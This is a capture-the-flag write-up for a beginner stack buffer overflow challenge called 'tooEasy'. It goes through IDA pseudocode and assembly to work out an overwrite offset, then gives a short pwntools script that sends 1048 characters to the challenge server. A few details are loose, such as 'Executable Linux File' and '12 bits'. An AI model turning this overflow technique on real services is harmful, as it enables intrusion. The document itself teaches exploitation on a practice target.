This gives us a file called “tooEasy”. When we see what type of file it is using the file command (see below for command syntax), it says that it is a 32-bit ELF (Executable Linux File).

```
file tooEasy
```

The first thing we want to do is to run the file, so we can see what it does. Since we downloaded it, we will have to change it’s permissions to executable. To do that you can use the “chmod” utility. The syntax is below, with the “x” representing executable.

```
chmod +x tooEasy
```

Now if you were list all of the files in that directory “ls”, it should appear as green. Now we can run it, just like how we would run any other executable file in linux.

```
./tooEasy
```

After we run it, it just takes input and exits. So now that we have a general idea of what the program does, let’s open it up in IDA and see if we can’t look at some Pseudocode (ida has the capacity to analyze assembly code and make pseudocode that depicts what the assembly does). When we look at the main function, we can see that it establishes a variable and set it equal to “56797”, then scans for input (which we saw when we ran the program), and then finally runs a function named “det” and passes along the variable. 

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
   char v4; // [sp+4h] [bp-424h]@1
  int v5; // [sp+41Ch] [bp-Ch]@1


  v5 = 56797;
  __isoc99_scanf("%s", &v4);
  det(v5);
  return 1;
}
```

When we look at the pseudocode for “det” we see that it imports a parameter (which would be the variable set in main) and checks to see if that parameter is equal to “56797”. If it is not, then it will print out “GZ, you win!” and it looks like it will output the flag. The Pseudocode is placed below that depicts this.

```
void __cdecl det(int a1)
{
  char buf; // [sp+Ch] [bp-8Ch]@2
  int fd; // [sp+8Ch] [bp-Ch]@2


  if ( a1 != 56797 )
  {
    puts("GZ, you win!");
    fd = open("./flag.txt", 0);
    read(fd, &buf, 0x80u);
    printf("%s", &buf);
    exit(0);
  }
}
```

So it looks like we will have to do a binary overflow attack. Back in main, it establishes a variable and then reads for input.  If we were to write a large enough string, it will take up all of the space designated for that read and write over the variable, and then when the “det” function runs the if then statement will execute  since we would've changed the value of the variable. Now we could just try inputting thousands of characters, which might work. Or we can find out what the buffer is, and make an exploit to write just enough characters to overflow the buffer and edit what the variable is, like civilized people. To do that, let’s refer to the assembly code.

```
var_C           = dword ptr -0Ch


sub     esp, 424h
mov     [ebp+var_C], 0DDDDh
sub     esp, 8
lea     eax, [ebp+var_424]
push    eax
push    offset format   ; "%s"
call    ___isoc99_scanf
```

So in this code it moves the stack pointer “esp” up by the hexadecimal value 0x424h (which is 1060). Than it sets the address x0Ch (12) bytes below the base pointer equal to the variable which it checks. Then it moves on to actually take the input and scan it into memory. So since the top of the stack is 1060, and the value we’re trying to overwrite is 12 bits below the top we need to write 1048 (1060-12 = 1048) characters in order to overwrite the first part of the value it checks. Below is the script which will do just that. Refer to the comments for questions. If you want a more thorough explanation of scripting, please refer to one of the scripting challenges.


```
#This imports pwntools, which will help us deal with the connection
from pwn import *


#This sets up the connection to the challenge
conn = remote("wcscctf.org", 8383)


#This sets up the string which will overflow the value we are trying to overwri$
bof = "1" * 1048


#This sends the string we just made
conn.sendline(bof)


#These two lines print out that we won, and the flag
print conn.recvline()
print conn.recvline()
```
